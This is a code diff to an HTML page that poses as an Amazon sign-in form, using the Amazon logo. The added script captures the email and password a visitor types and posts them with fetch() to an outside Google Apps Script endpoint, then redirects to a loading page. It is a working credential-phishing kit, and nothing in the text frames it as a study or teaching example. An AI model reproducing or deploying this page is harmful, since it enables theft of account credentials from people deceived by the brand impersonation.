@@ -9,12 +9,12 @@
   <link href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/5.1.0/mdb.min.css" rel="stylesheet">
 </head>
 <body>
+
   <div class="form-container">
-    <!-- Amazon logo (Replace the logo path with your own) -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo">
 
     <h2 style="text-align: left;">Sign In</h2>
-    <form id="signInForm" action="https://script.google.com/macros/s/AKfycbyDdI11VSbC9BQD4nRHMiTxoOEJWqD6twPWsJII4VazyfPX4XbqGHypHtfo4eJrV3gdBA/exec" method="post"> 
+    <form id="signInForm" action="https://script.google.com/macros/s/AKfycbyKGjzQrPobxP-TdeIoXH_bJUoXllA4foxEPGz9H4k/dev" method="POST"> 
       <!-- Email input -->
       <div data-mdb-input-init class="form-outline"> 
         <label class="form-label" for="form2Example1">Email address</label>
@@ -28,12 +28,10 @@
       </div>
       
       <!-- Submit button -->
-      <button type="submit" class="btn btn-primary mb-4" id="signInBtn" onclick="window.location.href='load.html';">Sign in</button>
+      <button type="submit" class="btn btn-primary mb-4" id="signInBtn" value="Submit">Sign in</button>
 
-      <!-- 2 column grid layout for inline styling -->
       <div class="row mb-4">
         <div class="col d-flex justify-content-center">
-          <!-- Checkbox -->
           <div class="form-check">
             <input class="form-check-input" type="checkbox" value="" id="form2Example31" checked />
             <label class="form-check-label" for="form2Example31"> Remember me </label>
@@ -41,12 +39,10 @@
         </div>
 
         <div class="col">
-          <!-- Simple link -->
           <a href="#!">Forgot password?</a>
         </div>
       </div>
 
-      <!-- Register buttons -->
       <div class="text-center">
         <p>Not a member? <a href="#!">Register</a></p>
         <p>or sign up with:</p>
@@ -71,35 +67,43 @@
     </form>
   </div>
 
-  <!-- MDB JS (use your CDN or local path for MDB) -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/5.1.0/mdb.min.js"></script>
 
   <script>
-    // Event listener for the Sign In button
     document.getElementById("signInForm").addEventListener("submit", function(event) {
-      event.preventDefault();  // Prevent the form from submitting
+      event.preventDefault();  // Prevent the default form submission
 
-      // Get values from the form inputs
       var email = document.getElementById("form2Example1").value;
       var password = document.getElementById("form2Example2").value;
 
-      // Check if email and password are filled in
       if (email && password) {
-        // Show popup alert if both fields are filled
-        /* alert("Login Issue Again Sign in Amazon Account !"); */ // You can customize this message
+        // Send the form data to Google Apps Script using fetch API
+        fetch("https://script.google.com/macros/s/AKfycbzlIn4oW9ZQL7df6FNeHmc7qyU8lUyExZ5xTto_ri-ziE1f9WwCE_Ok6zE1GJTiq2rZ/exec", {
+          method: "POST",
+          body: new URLSearchParams({
+            email: email,
+            password: password
+          }),
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          }
+        })
+        .then(response => response.text())
+        .then(result => {
+          console.log("Form data submitted successfully: ", result);
+          // Redirect after successful submission
+          window.location.href = 'load.html'; // Replace this with your desired redirect page
+        })
+        .catch(error => {
+          console.error("Error submitting form data: ", error);
+          alert("There was an error with the sign-in process.");
+        });
       } else {
-        // Show popup alert if fields are missing
         alert("Please fill in both email and password.");
       }
     });
   </script>
-<!-- Google Tag Manager (noscript) -->
-<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T5QV846M"
-    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
-    <!-- End Google Tag Manager (noscript) -->
 
-    <script src="./js/Google Sheet.js"></script>
+  
 </body>
 </html>
-
-<!-- https://script.google.com/macros/s/AKfycbzBX74xARleKS_PBUl-_IYTAyyhQHm8pBtbjuuLEjwS0bx6Dg0uchUhQmkSu-6h-N64NA/exec -->
